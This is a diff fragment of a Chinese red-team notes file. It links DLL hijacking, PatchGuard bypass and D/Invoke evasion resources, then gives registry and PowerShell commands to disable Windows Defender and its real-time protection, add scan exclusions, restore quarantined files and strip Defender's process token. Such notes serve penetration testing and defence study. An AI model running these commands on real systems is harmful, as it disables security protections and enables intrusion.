+- [x64dbg中的白加黑利用](https://payloads.online/archivers/2022-08-17/1/)
+    - https://github.com/Rvn0xsy/Invoke-x64dbg-loaddll
+- [DEFCON议题解读｜Dll劫持新思路——修改环境变量](https://mp.weixin.qq.com/s/S1yA8M_0EMUBNScxd9NWjw)
+- [dll 劫持和应用](https://paper.seebug.org/1713/)
+- [Backdooring MSBuild - marpie (a12d404.net)](https://www.a12d404.net/ranting/2021/01/17/msbuild-backdoor.html)
+- https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security
+
+**相关工具**
+- [strivexjun/AheadLib-x86-x64](https://github.com/strivexjun/AheadLib-x86-x64) - hijack dll Source Code Generator. support x86/x64
+
+**相关项目**
+- [wietze/HijackLibs](https://github.com/wietze/HijackLibs)
+    - https://hijacklibs.net
+
+---
+
+### PatchGuard
+
+**相关工具**
+- [everdox/InfinityHook](https://github.com/everdox/InfinityHook) - Hook system calls, context switches, page faults and more.
+- [hfiref0x/UPGDSED](https://github.com/hfiref0x/UPGDSED) - Universal PatchGuard and Driver Signature Enforcement Disable
+
+---
+
+### Hook
+
+#### D/Invoke
+
+**相关文章**
+- [破局P/Invoke，D/Invoke隐匿技术与武器化实现剖析](https://mp.weixin.qq.com/s/aqDnt211GL1v-BfO41SJSQ)
+- [Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke & API Hooks)](https://thewover.github.io/Dynamic-Invoke/)
+- [Syscalls with D/Invoke](https://offensivedefence.co.uk/posts/dinvoke-syscalls/)
 
 ---
 
@@ -1527,3 +1819,168 @@ Tgs::s4u /tgt:service_account_tgt_file /user:administrator@ffffffff0x.com /servi
     manage-bde -unlock E: -RecoveryPassword xxxxxx-xxxxxx-xxxxxx-xxxxxx-xxxxxx-xxxxxx-xxxxxx-xxxxxx
     ```
 - diskgenius 也可以解锁
+
+---
+
+## Windows Defender
+
+**相关文章**
+- [渗透基础——Windows Defender](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows-Defender)
+
+**查看Windows Defender版本**
+```
+dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b
+```
+
+**查看已存在的查杀排除列表**
+```bash
+# 注册表方式查看
+reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
+
+# powershell 方式查看
+Get-MpPreference | select ExclusionPath
+```
+
+**关闭 Windows Defender**
+```bash
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD /f
+# 之后重启电脑应用修改
+
+# 取消关闭(实测,部分场景会自动开启)
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /f
+```
+
+### Tamper Protection
+
+- https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide
+
+当开启Tamper Protection时，用户将无法通过注册表、Powershell和组策略修改Windows Defender的配置
+
+开启Tamper Protection的方法：依次选择Windows Security->Virus & theat protection settings，启用Tamper Protection
+```bash
+# 注册表方式开启
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /d 5 /t REG_DWORD /f
+```
+
+关闭Tamper Protection的方法：依次选择Windows Security->Virus & theat protection settings，禁用Tamper Protection
+```bash
+# 注册表方式关闭
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /d 4 /t REG_DWORD /f
+```
+
+无法通过修改注册表的方式去设置Tamper Protection，只能通过面板进行修改
+
+查看Tamper Protection的状态：
+```bash
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection"
+```
+
+返回结果中的数值5代表开启，数值4代表关闭
+
+### 关闭Windows Defender的Real-time protection
+
+利用条件：
+- 需要 TrustedInstaller 权限
+- 需要关闭 Tamper Protection
+
+```bash
+# 注册表方式关闭
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /d 1 /t REG_DWORD /f
+
+# 注册表方式开启
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f
+
+# 使用 AdvancedRun 关闭
+AdvancedRun.exe /EXEFilename "%windir%\system32\cmd.exe" /CommandLine '/c reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /d 1 /t REG_DWORD /f' /RunAs 8 /Run
+
+# powershell 方式关闭(新版不可用❌)
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# 组策略关闭(新版不可用❌)
+gpedit.msc->Computer Configuration->Administrative Templates->Windows Components->Microsoft Defender Antivirus->Real-time Protection，选择Turn off real-time protection，配置成Enable
+```
+
+### 添加查杀排除列表
+
+- https://docs.microsoft.com/en-us/powershell/module/defender/add-mppreference?view=windowsserver2022-ps
+
+利用条件：
+- (注册表)需要TrustedInstaller权限
+- (powershell)需要管理员权限
+
+```bash
+# 注册表方式添加
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\test" /d 0 /t REG_DWORD /f
+
+# powershell 方式添加
+Add-MpPreference -ExclusionPath "C:\test"
+# powershell 方式删除
+Remove-MpPreference -ExclusionPath "C:\test"
+```
+
+### 恢复被隔离的文件
+
+- https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/command-line-arguments-microsoft-defender-antivirus?view=o365-worldwide
+
+定位MpCmdRun
+```bash
+dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b
+```
+
+获得 `<antimalware platform version>`
+
+MpCmdRun 的位置为：`C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>`
+
+```bash
+# 查看被隔离的文件列表
+MpCmdRun -Restore -ListAll
+
+# 恢复指定名称的文件至原目录：
+MpCmdRun -Restore -FilePath C:\test\xxxxx.zip
+
+# 恢复所有文件至原目录：
+MpCmdRun -Restore -All
+
+# 查看指定路径是否位于排除列表中：
+MpCmdRun -CheckExclusion -path C:\test
+```
+
+### 移除Token导致Windows Defender失效
+
+Windows Defender进程为MsMpEng.exe,MsMpEng.exe是一个受保护的进程(Protected Process Light，简写为PPL)
+
+非 PPL 进程无法获取 PPL 进程的句柄，导致我们无法直接结束 PPL 进程 MsMpEng.exe, 但是我们能够以 SYSTEM 权限运行的线程修改进程 MsMpEng.exe 的 token, 当我们移除进程 MsMpEng.exe 的所有 token 后，进程 MsMpEng.exe 无法访问其他进程的资源，也就无法检测其他进程是否有害，最终导致 Windows Defender 失效
+
+- https://github.com/pwn1sher/KillDefender
+- https://github.com/Octoberfest7/KillDefender
+
+利用条件：
+- 需要管理员权限
+
+![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/12.png)
+
+**防御手段**
+- https://github.com/elastic/PPLGuard
+
+### ASR 规则
+
+**关于 ASR 规则**
+- https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide
+
+**相关资源**
+- [HackingLZ/ExtractedDefender](https://github.com/HackingLZ/ExtractedDefender)
+- https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3
+
+**相关文章**
+- [Extracting Whitelisted Paths from Windows Defender ASR Rules](https://adamsvoboda.net/extracting-asr-rules/)
+
+### VDM 文件提取
+
+Windows Defender 签名/规则存储在 VDM 容器中。其中许多只是 Lua 脚本文件。可以使用 WDExtract 等工具从这些容器中解密和提取所有 PE 图像。
+
+**关于 VDM 格式**
+- https://github.com/commial/experiments/tree/master/windows-defender/VDM
+
+**相关工具**
+- [hfiref0x/WDExtract](https://github.com/hfiref0x/WDExtract) - Extract Windows Defender database from vdm files and unpack it
+- https://github.com/commial/experiments/tree/master/windows-defender/lua
